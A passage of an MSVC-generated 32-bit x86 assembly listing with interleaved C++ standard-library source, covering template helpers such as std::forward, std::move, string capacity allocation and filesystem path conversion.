??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z ENDP ; <lambda_c1b8c41cb4019640539cfd828748c4d4>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0ABV?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@D@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
__Val1$ = 12						; size = 4
??$?0ABV?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@D@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> const &>, COMDAT
; _this$ = ecx

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Val1$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$forward@ABV?$allocator@D@std@@@std@@YAABV?$allocator@D@0@ABV10@@Z ; std::forward<std::allocator<char> const &>
  00010	83 c4 04	 add	 esp, 4
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 08 00	 ret	 8
??$?0ABV?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@D@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z
_TEXT	SEGMENT
__Old_val$ = -4						; size = 4
__Val$ = 8						; size = 4
__New_val$ = 12						; size = 4
??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z PROC ; std::exchange<std::_Facet_base *,std::nullptr_t>, COMDAT

; 760  :     conjunction_v<is_nothrow_move_constructible<_Ty>, is_nothrow_assignable<_Ty&, _Other>>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 761  :     // assign _New_val to _Val, return previous _Val
; 762  :     _Ty _Old_val = static_cast<_Ty&&>(_Val);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	89 4d fc	 mov	 DWORD PTR __Old_val$[ebp], ecx

; 763  :     _Val         = static_cast<_Other&&>(_New_val);

  0000c	8b 55 08	 mov	 edx, DWORD PTR __Val$[ebp]
  0000f	8b 45 0c	 mov	 eax, DWORD PTR __New_val$[ebp]
  00012	8b 08		 mov	 ecx, DWORD PTR [eax]
  00014	89 0a		 mov	 DWORD PTR [edx], ecx

; 764  :     return _Old_val;

  00016	8b 45 fc	 mov	 eax, DWORD PTR __Old_val$[ebp]

; 765  : }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c3		 ret	 0
??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ENDP ; std::exchange<std::_Facet_base *,std::nullptr_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@ABQA_W@std@@YAABQA_WABQA_W@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABQA_W@std@@YAABQA_WABQA_W@Z PROC		; std::forward<wchar_t * const &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@ABQA_W@std@@YAABQA_WABQA_W@Z ENDP		; std::forward<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z PROC ; std::move<std::filesystem::_Dir_enum_impl * &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z ENDP ; std::move<std::filesystem::_Dir_enum_impl * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z PROC ; std::move<std::_Ref_count_base * &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z ENDP ; std::move<std::_Ref_count_base * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AAPAD@std@@YAAAPADAAPAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPAD@std@@YAAAPADAAPAD@Z PROC		; std::forward<char * &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@AAPAD@std@@YAAAPADAAPAD@Z ENDP		; std::forward<char * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PAD@std@@YAPAPADAAPAD@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@PAD@std@@YAPAPADAAPAD@Z PROC		; std::addressof<char *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@PAD@std@@YAPAPADAAPAD@Z ENDP		; std::addressof<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AAPA_W@std@@YAAAPA_WAAPA_W@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPA_W@std@@YAAAPA_WAAPA_W@Z PROC		; std::forward<wchar_t * &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@AAPA_W@std@@YAAAPA_WAAPA_W@Z ENDP		; std::forward<wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z PROC		; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z ENDP		; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z PROC ; std::forward<std::allocator<char> >, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ENDP ; std::forward<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z PROC ; std::_Construct_in_place<char *,char * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Obj$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$addressof@PAD@std@@YAPAPADAAPAD@Z ; std::addressof<char *>
  0000d	83 c4 04	 add	 esp, 4
  00010	50		 push	 eax
  00011	6a 04		 push	 4
  00013	e8 00 00 00 00	 call	 ??2@YAPAXIPAX@Z		; operator new
  00018	83 c4 08	 add	 esp, 8
  0001b	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0001e	8b 4d 0c	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  00021	51		 push	 ecx
  00022	e8 00 00 00 00	 call	 ??$forward@ABQAD@std@@YAABQADABQAD@Z ; std::forward<char * const &>
  00027	83 c4 04	 add	 esp, 4
  0002a	8b 55 fc	 mov	 edx, DWORD PTR $T1[ebp]
  0002d	8b 00		 mov	 eax, DWORD PTR [eax]
  0002f	89 02		 mov	 DWORD PTR [edx], eax

; 256  :     }
; 257  : }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ENDP ; std::_Construct_in_place<char *,char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z
_TEXT	SEGMENT
__Fancy_ptr$ = -4					; size = 4
__Al$ = 8						; size = 4
__Capacity$ = 12					; size = 4
??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	83 c1 01	 add	 ecx, 1
  0000c	8b 55 0c	 mov	 edx, DWORD PTR __Capacity$[ebp]
  0000f	89 0a		 mov	 DWORD PTR [edx], ecx

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  00011	8b 45 0c	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00014	50		 push	 eax
  00015	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  00018	51		 push	 ecx
  00019	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPADAAV?$allocator@D@0@AAI@Z ; std::_Allocate_at_least_helper<std::allocator<char> >
  0001e	83 c4 08	 add	 esp, 8
  00021	89 45 fc	 mov	 DWORD PTR __Fancy_ptr$[ebp], eax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00024	8b 55 0c	 mov	 edx, DWORD PTR __Capacity$[ebp]
  00027	8b 02		 mov	 eax, DWORD PTR [edx]
  00029	83 e8 01	 sub	 eax, 1
  0002c	8b 4d 0c	 mov	 ecx, DWORD PTR __Capacity$[ebp]
  0002f	89 01		 mov	 DWORD PTR [ecx], eax

; 2634 :         return _Fancy_ptr;

  00031	8b 45 fc	 mov	 eax, DWORD PTR __Fancy_ptr$[ebp]

; 2635 :     }

  00034	8b e5		 mov	 esp, ebp
  00036	5d		 pop	 ebp
  00037	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@V?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@V?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z PROC ; std::forward<std::allocator<wchar_t> >, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@V?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ENDP ; std::forward<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z
_TEXT	SEGMENT
__Fancy_ptr$ = -4					; size = 4
__Al$ = 8						; size = 4
__Capacity$ = 12					; size = 4
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	83 c1 01	 add	 ecx, 1
  0000c	8b 55 0c	 mov	 edx, DWORD PTR __Capacity$[ebp]
  0000f	89 0a		 mov	 DWORD PTR [edx], ecx

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  00011	8b 45 0c	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00014	50		 push	 eax
  00015	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  00018	51		 push	 ecx
  00019	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPA_WAAV?$allocator@_W@0@AAI@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0001e	83 c4 08	 add	 esp, 8
  00021	89 45 fc	 mov	 DWORD PTR __Fancy_ptr$[ebp], eax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00024	8b 55 0c	 mov	 edx, DWORD PTR __Capacity$[ebp]
  00027	8b 02		 mov	 eax, DWORD PTR [edx]
  00029	83 e8 01	 sub	 eax, 1
  0002c	8b 4d 0c	 mov	 ecx, DWORD PTR __Capacity$[ebp]
  0002f	89 01		 mov	 DWORD PTR [ecx], eax

; 2634 :         return _Fancy_ptr;

  00031	8b 45 fc	 mov	 eax, DWORD PTR __Fancy_ptr$[ebp]

; 2635 :     }

  00034	8b e5		 mov	 esp, ebp
  00036	5d		 pop	 ebp
  00037	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_Source_to_wide@$$BY04DU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@AAY04$$CBDU_Normal_conversion@01@@Z
_TEXT	SEGMENT
$T1 = -8						; size = 8
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
__Tag$ = 16						; size = 1
??$_Convert_Source_to_wide@$$BY04DU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@AAY04$$CBDU_Normal_conversion@01@@Z PROC ; std::filesystem::_Convert_Source_to_wide<char [5],std::filesystem::_Normal_conversion>, COMDAT

; 280  :     _NODISCARD wstring _Convert_Source_to_wide(const _Src& _Source, _Conversion _Tag = {}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 281  :         return _Convert_stringoid_to_wide(_Stringoid_from_Source(_Source), _Tag);

  00006	0f b6 45 10	 movzx	 eax, BYTE PTR __Tag$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Source$[ebp]
  0000e	51		 push	 ecx
  0000f	8d 55 f8	 lea	 edx, DWORD PTR $T1[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ??$_Stringoid_from_Source@$$BY04D@filesystem@std@@YA?A_PAAY04$$CBD@Z ; std::filesystem::_Stringoid_from_Source<char [5]>
  00018	83 c4 08	 add	 esp, 8
  0001b	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001e	51		 push	 ecx
  0001f	8b 10		 mov	 edx, DWORD PTR [eax]
  00021	52		 push	 edx
  00022	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00025	50		 push	 eax
  00026	e8 00 00 00 00	 call	 ??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
  0002b	83 c4 10	 add	 esp, 16			; 00000010H
  0002e	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 282  :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Convert_Source_to_wide@$$BY04DU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@AAY04$$CBDU_Normal_conversion@01@@Z ENDP ; std::filesystem::_Convert_Source_to_wide<char [5],std::filesystem::_Normal_conversion>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_Source_to_wide@PBDU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABQBDU_Normal_conversion@01@@Z
_TEXT	SEGMENT
$T1 = -8						; size = 8
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
__Tag$ = 16						; size = 1
??$_Convert_Source_to_wide@PBDU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABQBDU_Normal_conversion@01@@Z PROC ; std::filesystem::_Convert_Source_to_wide<char const *,std::filesystem::_Normal_conversion>, COMDAT

; 280  :     _NODISCARD wstring _Convert_Source_to_wide(const _Src& _Source, _Conversion _Tag = {}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 281  :         return _Convert_stringoid_to_wide(_Stringoid_from_Source(_Source), _Tag);

  00006	0f b6 45 10	 movzx	 eax, BYTE PTR __Tag$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Source$[ebp]
  0000e	51		 push	 ecx
  0000f	8d 55 f8	 lea	 edx, DWORD PTR $T1[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ??$_Stringoid_from_Source@PBD@filesystem@std@@YA?A_PABQBD@Z ; std::filesystem::_Stringoid_from_Source<char const *>
  00018	83 c4 08	 add	 esp, 8
  0001b	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001e	51		 push	 ecx
  0001f	8b 10		 mov	 edx, DWORD PTR [eax]
  00021	52		 push	 edx
  00022	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00025	50		 push	 eax
  00026	e8 00 00 00 00	 call	 ??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
  0002b	83 c4 10	 add	 esp, 16			; 00000010H
  0002e	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 282  :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Convert_Source_to_wide@PBDU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABQBDU_Normal_conversion@01@@Z ENDP ; std::filesystem::_Convert_Source_to_wide<char const *,std::filesystem::_Normal_conversion>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ
_TEXT	SEGMENT
tv69 = -8						; size = 4
_this$ = -4						; size = 4
?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail, COMDAT
; _this$ = ecx

; 260  :     streamsize __CLR_OR_THIS_CALL _Pnavail() const noexcept { // count number of available positions in write buffer

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 261  :         return *_IPnext ? *_IPcount : 0;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
